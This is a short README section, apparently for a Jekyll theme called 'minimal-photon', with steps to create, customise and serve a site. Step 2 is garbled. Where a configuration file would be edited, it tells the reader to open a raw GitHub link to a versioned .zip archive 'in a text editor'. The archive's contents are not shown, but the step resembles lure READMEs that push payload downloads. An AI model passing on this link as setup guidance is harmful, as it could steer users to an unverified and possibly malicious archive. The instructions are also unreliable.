## üìÑ How to Use the Theme

1. **Start a New Jekyll Site:**
   Follow the instructions below to create a new Jekyll site:
   - Open your command line interface (Terminal, Command Prompt, or Git Bash).
   - Type `jekyll new my-academic-site` and press Enter. This will create a new folder.
   - Navigate to that folder by typing `cd my-academic-site`.

2. **Replace with Our Theme:**
   - Open the `https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip` file in a text editor.
   - Change the `theme` field to `minimal-photon`.

3. **Customize Your Site:**
   - Edit the existing files in the `_posts` folder for your resume and portfolio.
   - Modify the `_layouts` folder for layout preferences (e.g., homepage design).

4. **Run Your Site:**
   Type the following command to start your site:
   ```
   jekyll serve
   ```
   Open your web browser and go to `http://localhost:4000` to see your new homepage live!
